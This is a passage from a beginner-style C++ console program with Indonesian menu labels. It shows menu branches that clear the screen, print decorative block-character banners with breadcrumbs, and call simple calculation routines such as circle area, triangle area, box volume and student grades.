            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Hitung Lama Pengerjaan Proyek" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;hitung_lama_pengerjaan_proyek();cout << endl;cout << endl;
        }
		else if(pilihan == 9)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Hitung Luas Lingkaran" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;hitung_luas_lingkaran();cout << endl;cout << endl;
        }
		else if(pilihan == 10)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Hitung Luas Segitiga" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;hitung_luas_segitiga();cout << endl;cout << endl;
        }
		else if(pilihan == 11)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Hitung Nilai Akhir Mahasiswa" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;hitung_nilai_akhir_mahasiswa();cout << endl;cout << endl;
        }
		else if(pilihan == 12)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Hitung Nilai Rata-Rata Item" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;hitung_nilai_rata_rata_item();cout << endl;cout << endl;
        }
		else if(pilihan == 13)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Hitung Perimeter dan Luas Persegi Panjang" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;hitung_perimeter_dan_luas_persegi_panjang();cout << endl;cout << endl;
        }
		else if(pilihan == 14)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Hitung Total Biaya dari Perhitungan Jarak dan Bensin" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;hitung_total_biaya_dari_perhitungan_jarak_dan_bensin();cout << endl;cout << endl;
        }
		else if(pilihan == 15)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Hitung Volume Balok" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;hitung_volume_balok();cout << endl;cout << endl;
        }
		else if(pilihan == 16)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Kalkulator Sederhana" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;kalkulator_sederhana();cout << endl;cout << endl;
        }
		else if(pilihan == 17)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Konversi Angka Ribuan menjadi 4 Pecahan Bilangan" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;konversi_angka_ribuan_menjadi_4_pecahan_bilangan();cout << endl;cout << endl;
        }
		else if(pilihan == 18)
        {
			system("cls");int pilihan;
